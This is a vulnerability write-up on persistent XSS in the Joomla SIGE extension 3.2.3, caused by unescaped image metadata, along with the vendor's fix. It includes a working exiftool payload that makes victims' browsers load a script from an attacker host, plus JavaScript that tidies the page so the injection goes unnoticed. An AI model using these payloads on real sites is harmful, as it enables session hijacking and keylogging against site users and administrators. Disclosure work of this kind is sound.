---
layout: post
title: Persistent XSS via image metadata
---

Joomla SIGE is a popular extension for creating image galleries within the [Joomla CMS](https://www.joomla.org/). An injection vulnerability was discovered that enables execution of a [Cross Site Scripting (XSS)](https://excess-xss.com/) attack. The extension does not sanitize the text that it retrieves from the image header. Once published online the the image will cause the browser to load malicious content.

# Vulnerability Details
The version I tested against is 3.2.3 from the Joomla extensions page [0].

In the `htmlImageAddTitleAttribute` function, the title of the image is incorporated into the the HTML:

On line 1669 of sige.php:
```php
if($this->plugin_parameters['image_info'])
{
    $html .= '&lt;strong&gt;&lt;em&gt;' . 
                $image_title . 
                '&lt;/em&gt;&lt;/strong&gt;';

    if(!empty($image_description))
    {
           $html .= ' - ' . $image_description;
    }
}
```

The variable `image_description` is not escaped properly and allows any character to be sent to the user. The value of this variable is obtained via the `getimagesize` function in `iptcInfo` function on line 1515:

```php
private function iptcInfo($image, 
                          &$image_title, 
                          &$image_description)
{
  $iptc_title = '';
  $iptc_caption = '';
  $info = array();

  getimagesize(JPATH_SITE.$this->root_folder .
                           $this->images_dir . '/' . $image, 
               $info);
  ...
    $iptc_caption = utf8_encode(
                       html_entity_decode($data['caption'], 
                       ENT_NOQUOTES));
  ...
  if(!empty($iptc_caption))
  {
    $image_description = $iptc_caption;
  }
}
```

The the source of the data of the image description is not escaped and allows the HTML special characters to make their way to the user's browser.

# Exploitation
In order to take advantage of this vulnerability the attacker needs to prepare an image with malicious content:

```sh
exiftool '-Caption-Abstract=">
              <script src="http://192.168.0.101:8000/xss.js" 
                      id="boom">
              </script><img s="' 
          image.jpg
```

This can be done by rewriting the `Caption-Abstract` header object in a JPEG file using the exif command line tool. In the value, the attacker places a script tag which loads JavaScript from an attacker controlled web server. Since the content will be injected into an `<a />` html tag, it is necessary to close and reopen the double quotes.

Next, the attacker will need to place the image into the gallery. There are multiple scenarios for how this could happen:

- A gallery may allow the public or low-privileged members to upload images.
- An attacker may already have another vulnerability which allows them to place an image into the gallery directory. 
- The gallery administrator might inadvertently download a malicious image from somewhere on the internet and expose everyone who views the gallery.

Once the image description is displayed to the user, the attacker can launch attacks against the browser or anything else within the context of the user - which could be the Joomla administrator.

The problem is that injecting this HTML messes up the DOM of the page, making the exploit not very stealthy. And so, the first thing that the `xss.js` will do is clean up. Note that the clean up code has to protect from cleaning up twice because the EXIF caption is inserted twice by the SIGE plugin.

```javascript
if(window.booms == undefined) {
  window.booms = "true";

  setTimeout(function() {
    // remove the first one.
    window.boom.remove();
    var parent = window.boom.parentElement.parentElement;

    // remove the second one.
    window.boom.remove();

    var imgs = parent.getElementsByTagName("img");
    var as = parent.getElementsByTagName("a");

    as[0].title += imgs[0].getAttribute("s");
    imgs[0].remove();

    imgs[0].setAttribute("src", imgs[1].getAttribute("src"));
    imgs[1].remove();
    
    // console.info("Now do evil things :-)");
  }, 200);
}
```

Even though this isn't stricly necessary, clean up is good so that users don't tip off the developers or administrators. This clean up code will remove the script tags and the corrupted image tags but it will maintain a thread of execution to throw browser exploits [1], javascript key loggers [2] or bitcoin miners [3].

# The fix
To fix the vulnerability, the image description field needs to be sanitised in the `htmlImageAddTitleAttribute` function, before it reaches the HTML content. PHP provides the htmlspecialchars function to do this. Thanks to Viktor Vogel of Kubik-Rubik for fixing and releasing an update very quickly [4]! 

```php
    private function setImageInformation(&$fileInfo)
    {
        ...
        if ($this->pluginParameters['iptc'] == 1) {
            $this->iptcInfo();
        }

        $this->imageInfo = array_map('htmlspecialchars', 
                             $this->imageInfo);
    }
```

In my tests I was able to confirm that version 3.3.1 is not vulnerable to this exploit. The above code on line 1321 maps over all the data retrieved from the image and applied the `htmlspecialchars` function. This ensures that everything from the EXIF header is properly escaped before it is presented to the user.

---

0 - [Joomla! Extensions Directory](https://extensions.joomla.org/extension/sige/)

1 - [A Peek Inside the ‘Eleonore’ Browser Exploit Kit](https://krebsonsecurity.com/2010/01/a-peek-inside-the-eleonore-browser-exploit-kit/)

2 - [Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)

3 - [brominer.com](https://brominer.com/)

4 - [SIGE Joomla Extension](https://joomla-extensions.kubik-rubik.de/sige-simple-image-gallery-extended)